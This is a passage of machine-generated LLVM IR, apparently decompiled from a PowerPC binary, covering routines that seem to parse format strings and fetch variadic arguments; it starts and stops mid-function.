  %v0_10005fac = load i32, i32* %r24.global-to-local, align 4
  %v0_10005fb4 = load i32, i32* @r28, align 4
  store i32 268459964, i32* @lr, align 4
  %v4_10005fb8 = call i32 @function_10005884(i32 %v0_10005fac, i8 32, i32 %v0_10005fb4)
  %v1_10005fbc = load i32, i32* @r28, align 4
  %v4_10005fbc = icmp eq i32 %v4_10005fb8, %v1_10005fbc
  br i1 %v4_10005fbc, label %dec_label_pc_10005fc4, label %dec_label_pc_10005fd8

dec_label_pc_10005fc4:                            ; preds = %dec_label_pc_10005fac, %dec_label_pc_10005d14, %dec_label_pc_10005ae8
  %stack_var_-184.2 = phi i32 [ %v0_10005c1c, %dec_label_pc_10005ae8 ], [ %stack_var_-184.1, %dec_label_pc_10005fac ], [ %v0_10005c1c, %dec_label_pc_10005d14 ]
  %v3_10005fc4 = load i8*, i8** %stack_var_-200, align 4
  %v4_10005fc4 = ptrtoint i8* %v3_10005fc4 to i32
  store i32 %v4_10005fc4, i32* @r29, align 4
  br label %dec_label_pc_10005fc8

dec_label_pc_10005fc8:                            ; preds = %dec_label_pc_100059dc, %dec_label_pc_10005fc4
  %v0_10005fc8 = phi i32 [ %v0_10005fc8.pre, %dec_label_pc_100059dc ], [ %v4_10005fc4, %dec_label_pc_10005fc4 ]
  %v0_10005c1c = phi i32 [ %tmp56, %dec_label_pc_100059dc ], [ %stack_var_-184.2, %dec_label_pc_10005fc4 ]
  br label %dec_label_pc_100059f4

dec_label_pc_10005fd8:                            ; preds = %dec_label_pc_10005e30, %dec_label_pc_10005fac, %dec_label_pc_10005f3c, %dec_label_pc_10005ee8, %dec_label_pc_10005ecc, %dec_label_pc_10005d8c, %dec_label_pc_10005d5c, %dec_label_pc_10005cf0, %dec_label_pc_10005a30, %dec_label_pc_10005f80
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005fdc

dec_label_pc_10005fdc:                            ; preds = %dec_label_pc_10005a3c, %dec_label_pc_100059b4, %dec_label_pc_100059cc, %dec_label_pc_10005fd8
  store i32 %v0_10005988, i32* %r0.global-to-local, align 4
  %v0_10005fe0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10005fe0

; uselistorder directives
  uselistorder i32 %v0_10005c1c, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10005fa4, { 1, 2, 0 }
  uselistorder i32 %v1_10005eb8, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10005e48, { 1, 0 }
  uselistorder i32 %v2_10005dd8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10005d38, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10005c1c, { 1, 0 }
  uselistorder i32 %v6_10005bd4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10005bb8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10005ba4, { 1, 0 }
  uselistorder i32 %v1_10005b48, { 1, 0 }
  uselistorder i1 %v2_10005b3c, { 1, 0 }
  uselistorder i32 %v0_10005aec, { 1, 0, 2 }
  uselistorder i32 %v1_10005ad8, { 1, 0 }
  uselistorder i32 %v0_10005ad0, { 1, 0 }
  uselistorder i32 %v1_10005acc, { 1, 0 }
  uselistorder i32 %v1_10005a48, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10005a10, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10005a20, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10005e3c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_10005a84, { 1, 2, 0 }
  uselistorder i32 %v4_10005a7c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 (i32, i8, i32)* @function_10005884, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4 }
  uselistorder i32 ()* @function_10009b2c, { 1, 0 }
  uselistorder label %dec_label_pc_10005fdc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10005fd8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10005fc8, { 1, 0 }
  uselistorder label %dec_label_pc_10005fac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005f80, { 1, 0 }
  uselistorder label %dec_label_pc_10005f5c, { 1, 0 }
  uselistorder label %dec_label_pc_10005ee8, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10005ea8, { 1, 0 }
  uselistorder label %dec_label_pc_10005e94, { 1, 0 }
  uselistorder label %dec_label_pc_10005e74, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005e74thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10005e68, { 1, 0 }
  uselistorder label %dec_label_pc_10005df8, { 1, 0 }
  uselistorder label %dec_label_pc_10005de4, { 1, 0 }
  uselistorder label %dec_label_pc_10005d5c, { 1, 0 }
  uselistorder label %dec_label_pc_10005cac, { 1, 0 }
  uselistorder label %dec_label_pc_10005c94, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10005c44, { 1, 0 }
  uselistorder label %dec_label_pc_10005c28, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10005bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10005b98, { 1, 0 }
  uselistorder label %dec_label_pc_10005b84, { 1, 0 }
  uselistorder label %dec_label_pc_10005b80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005b54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005adc, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10005aa0, { 1, 0 }
  uselistorder label %dec_label_pc_10005a3c, { 1, 0 }
  uselistorder label %dec_label_pc_10005a30, { 1, 0 }
  uselistorder label %dec_label_pc_100059f4, { 1, 0 }
}

define i32 @function_10005ff4(i32* %arg1) local_unnamed_addr {
dec_label_pc_10005ff4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10005ff8 = load i32, i32* @lr, align 4
  store i32 %v0_10005ff8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10006008 = load i32, i32* @r4, align 4
  store i32 %v0_10006008, i32* @r30, align 4
  store i32 268460056, i32* @lr, align 4
  %v3_10006014 = call i32 @function_100071a4(i32 0, i32 160, i32 160)
  %v0_10006018 = load i32, i32* @r31, align 4
  %v1_10006018 = add i32 %v0_10006018, 24
  %v2_10006018 = inttoptr i32 %v1_10006018 to i32*
  %v3_10006018 = load i32, i32* %v2_10006018, align 4
  store i32 %v3_10006018, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_10006020 = load i32, i32* @r30, align 4
  %v2_10006020 = inttoptr i32 %v0_10006018 to i32*
  store i32 %v0_10006020, i32* %v2_10006020, align 4
  %v0_10006024 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10006024, i32* %ctr.global-to-local, align 4
  %v0_10006028 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006028 = add i32 %v0_10006028, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10006030 = load i32, i32* @r31, align 4
  %v2_10006030 = add i32 %v1_10006030, 24
  %v3_10006030 = inttoptr i32 %v2_10006030 to i32*
  store i32 %v1_10006028, i32* %v3_10006030, align 4
  %v0_10006034 = load i32, i32* @r31, align 4
  %v1_10006034 = add i32 %v0_10006034, 40
  store i32 %v1_10006034, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006038

dec_label_pc_10006038:                            ; preds = %dec_label_pc_10006038, %dec_label_pc_10005ff4
  %v1_10006038 = phi i32 [ %v1_1000603c, %dec_label_pc_10006038 ], [ %v1_10006034, %dec_label_pc_10005ff4 ]
  %v0_10006038 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006038 = inttoptr i32 %v1_10006038 to i32*
  store i32 %v0_10006038, i32* %v2_10006038, align 4
  %v0_1000603c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000603c = add i32 %v0_1000603c, 4
  store i32 %v1_1000603c, i32* %r9.global-to-local, align 4
  %v0_10006040 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10006040 = add i32 %v0_10006040, -1
  store i32 %v1_10006040, i32* %ctr.global-to-local, align 4
  %v2_10006040 = icmp eq i32 %v1_10006040, 0
  br i1 %v2_10006040, label %dec_label_pc_10006044, label %dec_label_pc_10006038

dec_label_pc_10006044:                            ; preds = %dec_label_pc_10006038
  %v0_10006044 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006084

dec_label_pc_10006054:                            ; preds = %dec_label_pc_10006084
  %v3_1000608c = icmp eq i8 %v2_10006084, 37
  br i1 %v3_1000608c, label %dec_label_pc_10006058, label %dec_label_pc_10006080

dec_label_pc_10006058:                            ; preds = %dec_label_pc_10006054
  %v1_10006058 = add i32 %v0_10006058, 1
  %v2_10006058 = inttoptr i32 %v1_10006058 to i8*
  %v3_10006058 = load i8, i8* %v2_10006058, align 1
  %v4_10006058 = zext i8 %v3_10006058 to i32
  store i32 %v4_10006058, i32* %r0.global-to-local, align 4
  store i32 %v1_10006058, i32* %r9.global-to-local, align 4
  %v3_10006060 = icmp eq i8 %v3_10006058, 37
  br i1 %v3_10006060, label %dec_label_pc_10006080, label %dec_label_pc_10006068

dec_label_pc_10006068:                            ; preds = %dec_label_pc_10006058
  %v0_1000605c = load i32, i32* @r31, align 4
  %v2_10006068 = inttoptr i32 %v0_1000605c to i32*
  store i32 %v1_10006058, i32* %v2_10006068, align 4
  store i32 268460144, i32* @lr, align 4
  %v1_1000606c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000606c = call i32 @function_100063bc(i32* %v2_10006068, i32 %v1_1000606c)
  %v1_10006070 = icmp slt i32 %v3_1000606c, 0
  br i1 %v1_10006070, label %dec_label_pc_1000609c, label %dec_label_pc_10006078

dec_label_pc_10006078:                            ; preds = %dec_label_pc_10006068
  %v0_10006078 = load i32, i32* @r31, align 4
  %v1_10006078 = inttoptr i32 %v0_10006078 to i32*
  %v2_10006078 = load i32, i32* %v1_10006078, align 4
  br label %dec_label_pc_10006084

dec_label_pc_10006080:                            ; preds = %dec_label_pc_10006054, %dec_label_pc_10006058
  %v0_10006080 = phi i32 [ %v0_10006058, %dec_label_pc_10006054 ], [ %v1_10006058, %dec_label_pc_10006058 ]
  %v1_10006080 = add i32 %v0_10006080, 1
  br label %dec_label_pc_10006084

dec_label_pc_10006084:                            ; preds = %dec_label_pc_10006078, %dec_label_pc_10006080, %dec_label_pc_10006044
  %v0_10006058 = phi i32 [ %v0_10006044, %dec_label_pc_10006044 ], [ %v1_10006080, %dec_label_pc_10006080 ], [ %v2_10006078, %dec_label_pc_10006078 ]
  store i32 %v0_10006058, i32* %r9.global-to-local, align 4
  %v1_10006084 = inttoptr i32 %v0_10006058 to i8*
  %v2_10006084 = load i8, i8* %v1_10006084, align 1
  %v3_10006084 = zext i8 %v2_10006084 to i32
  store i32 %v3_10006084, i32* %r0.global-to-local, align 4
  %v3_10006088 = icmp eq i8 %v2_10006084, 0
  br i1 %v3_10006088, label %dec_label_pc_10006094, label %dec_label_pc_10006054

dec_label_pc_10006094:                            ; preds = %dec_label_pc_10006084
  %v0_10006094 = load i32, i32* @r30, align 4
  %v1_10006094 = load i32, i32* @r31, align 4
  %v2_10006094 = inttoptr i32 %v1_10006094 to i32*
  store i32 %v0_10006094, i32* %v2_10006094, align 4
  br label %dec_label_pc_1000609c

dec_label_pc_1000609c:                            ; preds = %dec_label_pc_10006068, %dec_label_pc_10006094
  %storemerge = phi i32 [ 0, %dec_label_pc_10006094 ], [ -1, %dec_label_pc_10006068 ]
  store i32 %v0_10005ff8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10006084, { 1, 2, 0 }
  uselistorder i32 %v0_10006058, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10006040, { 1, 0 }
  uselistorder i32 %v1_1000603c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000609c, { 1, 0 }
  uselistorder label %dec_label_pc_10006084, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006080, { 1, 0 }
}

define i32 @function_100060b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100060b0:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100060b0 = load i32, i32* @lr, align 4
  %v0_100060b8 = load i32, i32* @r3, align 4
  store i32 %v0_100060b8, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100060d4 = add i32 %v0_100060b8, 24
  %v2_100060d4 = inttoptr i32 %v1_100060d4 to i32*
  %v3_100060d4 = load i32, i32* %v2_100060d4, align 4
  store i32 %v3_100060d4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_100060d4, 1
  br i1 %tmp4, label %dec_label_pc_100060f8, label %dec_label_pc_100060e0

dec_label_pc_100060e0:                            ; preds = %dec_label_pc_100060b0
  %v2_100060e0 = add i32 %v0_100060b8, 8
  %v3_100060e0 = inttoptr i32 %v2_100060e0 to i32*
  store i32 0, i32* %v3_100060e0, align 4
  %v0_100060e4 = load i32, i32* @r30, align 4
  %v1_100060e4 = load i32, i32* @r3, align 4
  %v2_100060e4 = add i32 %v1_100060e4, 28
  %v3_100060e4 = inttoptr i32 %v2_100060e4 to i32*
  store i32 %v0_100060e4, i32* %v3_100060e4, align 4
  %v0_100060e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100060e8 = load i32, i32* @r3, align 4
  %v2_100060e8 = add i32 %v1_100060e8, 24
  %v3_100060e8 = inttoptr i32 %v2_100060e8 to i32*
  store i32 %v0_100060e8, i32* %v3_100060e8, align 4
  %v0_100060ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100060ec = load i32, i32* @r3, align 4
  %v2_100060ec = add i32 %v1_100060ec, 4
  %v3_100060ec = inttoptr i32 %v2_100060ec to i32*
  store i32 %v0_100060ec, i32* %v3_100060ec, align 4
  store i32 268460276, i32* @lr, align 4
  %v0_100060f0 = call i32 @function_1000610c()
  store i32 %v0_100060f0, i32* %r3.global-to-local, align 4
  %v0_100060f4 = load i32, i32* @r30, align 4
  %v1_100060f4 = load i32, i32* @r31, align 4
  %v2_100060f4 = add i32 %v1_100060f4, 24
  %v3_100060f4 = inttoptr i32 %v2_100060f4 to i32*
  store i32 %v0_100060f4, i32* %v3_100060f4, align 4
  %v0_10006108.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100060f8

dec_label_pc_100060f8:                            ; preds = %dec_label_pc_100060b0, %dec_label_pc_100060e0
  %v0_10006108 = phi i32 [ %v0_100060b8, %dec_label_pc_100060b0 ], [ %v0_10006108.pre, %dec_label_pc_100060e0 ]
  store i32 %v0_100060b0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10006108

; uselistorder directives
  uselistorder i32 ()* @function_1000610c, { 1, 0 }
  uselistorder label %dec_label_pc_100060f8, { 1, 0 }
}

define i32 @function_1000610c() local_unnamed_addr {
dec_label_pc_1000610c:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000610c = load i32, i32* @r3, align 4
  %v1_1000610c = add i32 %v0_1000610c, 24
  %v2_1000610c = inttoptr i32 %v1_1000610c to i32*
  %v3_1000610c = load i32, i32* %v2_1000610c, align 4
  store i32 %v3_1000610c, i32* %r0.global-to-local, align 4
  %v1_10006110 = add i32 %v0_1000610c, 88
  store i32 %v1_10006110, i32* %r8.global-to-local, align 4
  %v1_10006114 = add i32 %v0_1000610c, 8
  %v2_10006114 = inttoptr i32 %v1_10006114 to i32*
  %v3_10006114 = load i32, i32* %v2_10006114, align 4
  store i32 %v3_10006114, i32* %r9.global-to-local, align 4
  %v2_10006118 = icmp sgt i32 %v3_1000610c, 0
  %v3_10006118 = icmp eq i32 %v3_1000610c, 0
  store i1 %v2_10006118, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10006118, label %dec_label_pc_10006120, label %dec_label_pc_1000630c

dec_label_pc_10006120:                            ; preds = %dec_label_pc_1000610c
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_10006124 = icmp ne i32 %v3_10006114, -2147483648
  %v4_10006124 = icmp eq i32 %v3_10006114, -2147483648
  store i1 %v3_10006124, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006124, label %dec_label_pc_1000612c, label %dec_label_pc_1000616c

dec_label_pc_1000612c:                            ; preds = %dec_label_pc_10006120
  %v1_1000612c = add i32 %v0_1000610c, 76
  %v2_1000612c = inttoptr i32 %v1_1000612c to i8*
  %v3_1000612c = load i8, i8* %v2_1000612c, align 1
  %v4_1000612c = zext i8 %v3_1000612c to i32
  store i32 %v4_1000612c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000612c, i32* %r11.global-to-local, align 4
  %v2_10006134 = icmp ugt i8 %v3_1000612c, 8
  store i1 %v2_10006134, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000612c, 7
  br i1 %tmp, label %dec_label_pc_10006154, label %dec_label_pc_1000613c

dec_label_pc_1000613c:                            ; preds = %dec_label_pc_1000612c
  %v1_1000613c = add i32 %v0_1000610c, 84
  %v2_1000613c = inttoptr i32 %v1_1000613c to i32*
  %v3_1000613c = load i32, i32* %v2_1000613c, align 4
  %v1_10006140 = mul nuw nsw i32 %v4_1000612c, 4
  %v2_10006144 = add i32 %v3_1000613c, %v1_10006140
  store i32 %v2_10006144, i32* %r9.global-to-local, align 4
  %v1_10006148 = add nuw nsw i32 %v4_1000612c, 1
  store i32 %v1_10006148, i32* %r0.global-to-local, align 4
  %v1_1000614c = trunc i32 %v1_10006148 to i8
  store i8 %v1_1000614c, i8* %v2_1000612c, align 1
  br label %dec_label_pc_10006160

dec_label_pc_10006154:                            ; preds = %dec_label_pc_1000612c
  %v1_10006154 = add i32 %v0_1000610c, 80
  %v2_10006154 = inttoptr i32 %v1_10006154 to i32*
  %v3_10006154 = load i32, i32* %v2_10006154, align 4
  store i32 %v3_10006154, i32* %r9.global-to-local, align 4
  %v1_10006158 = add i32 %v3_10006154, 4
  store i32 %v1_10006158, i32* %r0.global-to-local, align 4
  store i32 %v1_10006158, i32* %v2_10006154, align 4
  br label %dec_label_pc_10006160

dec_label_pc_10006160:                            ; preds = %dec_label_pc_1000613c, %dec_label_pc_10006154
  %v0_10006160 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006160 = inttoptr i32 %v0_10006160 to i32*
  %v2_10006160 = load i32, i32* %v1_10006160, align 4
  store i32 %v2_10006160, i32* %r0.global-to-local, align 4
  %v1_10006164 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006164 = inttoptr i32 %v1_10006164 to i32*
  store i32 %v2_10006160, i32* %v2_10006164, align 4
  %v0_10006168 = load i32, i32* %r0.global-to-local, align 4
  %v1_10006168 = load i32, i32* @r3, align 4
  %v2_10006168 = add i32 %v1_10006168, 8
  %v3_10006168 = inttoptr i32 %v2_10006168 to i32*
  store i32 %v0_10006168, i32* %v3_10006168, align 4
  %v0_1000616c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000616c

dec_label_pc_1000616c:                            ; preds = %dec_label_pc_10006120, %dec_label_pc_10006160
  %v2_1000619c = phi i32 [ %v0_1000610c, %dec_label_pc_10006120 ], [ %v0_1000616c.pre, %dec_label_pc_10006160 ]
  %v1_1000616c = add i32 %v2_1000619c, 4
  %v2_1000616c = inttoptr i32 %v1_1000616c to i32*
  %v3_1000616c = load i32, i32* %v2_1000616c, align 4
  store i32 %v3_1000616c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_10006174 = icmp ne i32 %v3_1000616c, -2147483648
  %v4_10006174 = icmp eq i32 %v3_1000616c, -2147483648
  store i1 %v3_10006174, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_10006174, label %dec_label_pc_1000617c, label %dec_label_pc_100062fc.preheader

dec_label_pc_1000617c:                            ; preds = %dec_label_pc_1000616c
  %v1_1000617c = add i32 %v2_1000619c, 76
  %v2_1000617c = inttoptr i32 %v1_1000617c to i8*
  %v3_1000617c = load i8, i8* %v2_1000617c, align 1
  %v4_1000617c = zext i8 %v3_1000617c to i32
  store i32 %v4_1000617c, i32* %r10.global-to-local, align 4
  store i32 %v1_1000617c, i32* %r11.global-to-local, align 4
  %v2_10006184 = icmp ugt i8 %v3_1000617c, 8
  store i1 %v2_10006184, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000617c, 7
  br i1 %tmp22, label %dec_label_pc_100061a4, label %dec_label_pc_1000618c

dec_label_pc_1000618c:                            ; preds = %dec_label_pc_1000617c
  %v1_1000618c = add i32 %v2_1000619c, 84
  %v2_1000618c = inttoptr i32 %v1_1000618c to i32*
  %v3_1000618c = load i32, i32* %v2_1000618c, align 4
  %v1_10006190 = mul nuw nsw i32 %v4_1000617c, 4
  %v2_10006194 = add i32 %v3_1000618c, %v1_10006190
  store i32 %v2_10006194, i32* %r9.global-to-local, align 4
  %v1_10006198 = add nuw nsw i32 %v4_1000617c, 1
  store i32 %v1_10006198, i32* %r0.global-to-local, align 4
  %v1_1000619c = trunc i32 %v1_10006198 to i8
  store i8 %v1_1000619c, i8* %v2_1000617c, align 1
  br label %dec_label_pc_100061b0

dec_label_pc_100061a4:                            ; preds = %dec_label_pc_1000617c
  %v1_100061a4 = add i32 %v2_1000619c, 80
  %v2_100061a4 = inttoptr i32 %v1_100061a4 to i32*
  %v3_100061a4 = load i32, i32* %v2_100061a4, align 4
  store i32 %v3_100061a4, i32* %r9.global-to-local, align 4
  %v1_100061a8 = add i32 %v3_100061a4, 4
  store i32 %v1_100061a8, i32* %r0.global-to-local, align 4
  store i32 %v1_100061a8, i32* %v2_100061a4, align 4
  br label %dec_label_pc_100061b0

dec_label_pc_100061b0:                            ; preds = %dec_label_pc_1000618c, %dec_label_pc_100061a4
  %v0_100061b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100061b0 = inttoptr i32 %v0_100061b0 to i32*
  %v2_100061b0 = load i32, i32* %v1_100061b0, align 4
  store i32 %v2_100061b0, i32* %r0.global-to-local, align 4
  %v1_100061b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100061b4 = inttoptr i32 %v1_100061b4 to i32*
  store i32 %v2_100061b0, i32* %v2_100061b4, align 4
  %v0_100061b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100061b8 = load i32, i32* @r3, align 4
  %v2_100061b8 = add i32 %v1_100061b8, 4
  %v3_100061b8 = inttoptr i32 %v2_100061b8 to i32*
  store i32 %v0_100061b8, i32* %v3_100061b8, align 4
  %v0_100062fc5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100062fc.preheader

dec_label_pc_100062fc.preheader:                  ; preds = %dec_label_pc_1000616c, %dec_label_pc_100061b0
  %v0_100062fc5 = phi i32 [ %v2_1000619c, %dec_label_pc_1000616c ], [ %v0_100062fc5.pre, %dec_label_pc_100061b0 ]
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_100062fc6 = add i32 %v0_100062fc5, 28
  %v2_100062fc7 = inttoptr i32 %v1_100062fc6 to i32*
  %v3_100062fc8 = load i32, i32* %v2_100062fc7, align 4
  store i32 %v3_100062fc8, i32* %r0.global-to-local, align 4
  %v2_100063009 = icmp sgt i32 %v3_100062fc8, 0
  %v3_1000630010 = icmp slt i32 %v3_100062fc8, 0
  store i1 %v3_1000630010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_100063009, label %dec_label_pc_100061c4, label %dec_label_pc_1000634c

dec_label_pc_100061c4:                            ; preds = %dec_label_pc_100062fc.preheader, %dec_label_pc_100062f8
  %v2_100062d8 = phi i32 [ %v0_100062fc, %dec_label_pc_100062f8 ], [ %v0_100062fc5, %dec_label_pc_100062fc.preheader ]
  %v0_100061c4 = phi i32 [ %v1_100062f8, %dec_label_pc_100062f8 ], [ 0, %dec_label_pc_100062fc.preheader ]
  %v1_100061c4 = mul i32 %v0_100061c4, 4
  %v2_100061c8 = add i32 %v1_100061c4, %v2_100062d8
  store i32 %v2_100061c8, i32* %r9.global-to-local, align 4
  %v1_100061cc = add i32 %v2_100061c8, 40
  %v2_100061cc = inttoptr i32 %v1_100061cc to i32*
  %v3_100061cc = load i32, i32* %v2_100061cc, align 4
  store i32 %v3_100061cc, i32* %r0.global-to-local, align 4
  %v2_100061d0 = icmp sgt i32 %v3_100061cc, 8
  %v3_100061d0 = icmp eq i32 %v3_100061cc, 8
  store i1 %v2_100061d0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100061d0, label %dec_label_pc_100062f8, label %dec_label_pc_100061d8

dec_label_pc_100061d8:                            ; preds = %dec_label_pc_100061c4
  %v1_100061d8 = add i32 %v2_100062d8, 76
  store i32 %v1_100061d8, i32* %r10.global-to-local, align 4
  br i1 %v2_100061d0, label %dec_label_pc_100061f4, label %dec_label_pc_100061e0

dec_label_pc_100061e0:                            ; preds = %dec_label_pc_100061d8
  %v2_100061e0 = icmp sgt i32 %v3_100061cc, 2
  store i1 %v2_100061e0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_100061cc, 3
  br i1 %tmp23, label %dec_label_pc_100062bc, label %dec_label_pc_1000620c

dec_label_pc_100061f4:                            ; preds = %dec_label_pc_100061d8
  %v2_100061f4 = icmp sgt i32 %v3_100061cc, 1024
  store i1 %v2_100061f4, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_100061cc, 1025
  br i1 %tmp24, label %dec_label_pc_100062bc, label %dec_label_pc_10006200

dec_label_pc_10006200:                            ; preds = %dec_label_pc_100061f4
  %v2_10006200 = icmp sgt i32 %v3_100061cc, 2048
  %v3_10006200 = icmp eq i32 %v3_100061cc, 2048
  store i1 %v2_10006200, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10006200, label %dec_label_pc_10006214, label %dec_label_pc_10006208

dec_label_pc_10006208:                            ; preds = %dec_label_pc_10006200
  %v2_10006208 = icmp sgt i32 %v3_100061cc, 2055
  %v3_10006208 = icmp eq i32 %v3_100061cc, 2055
  store i1 %v2_10006208, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_10006208, label %dec_label_pc_10006270, label %dec_label_pc_100062bc

dec_label_pc_1000620c:                            ; preds = %dec_label_pc_100061e0
  %v3_100061ec = icmp eq i32 %v3_100061cc, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_100061ec, label %dec_label_pc_10006270, label %dec_label_pc_100062bc

dec_label_pc_10006214:                            ; preds = %dec_label_pc_10006200
  %v2_10006214 = inttoptr i32 %v1_100061d8 to i8*
  %v3_10006214 = load i8, i8* %v2_10006214, align 1
  %v4_10006214 = zext i8 %v3_10006214 to i32
  %v2_10006218 = icmp ugt i8 %v3_10006214, 6
  store i1 %v2_10006218, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_10006214, 2
  %v1_1000621c = zext i8 %tmp28 to i32
  store i32 %v1_1000621c, i32* %r9.global-to-local, align 4
  %v2_10006220 = add nuw nsw i32 %v1_1000621c, %v4_10006214
  store i32 %v2_10006220, i32* %r0.global-to-local, align 4
  %v1_10006224 = trunc i32 %v2_10006220 to i8
  store i8 %v1_10006224, i8* %v2_10006214, align 1
  %v0_10006228 = load i1, i1* %cr7_gt.global-to-local, align 1
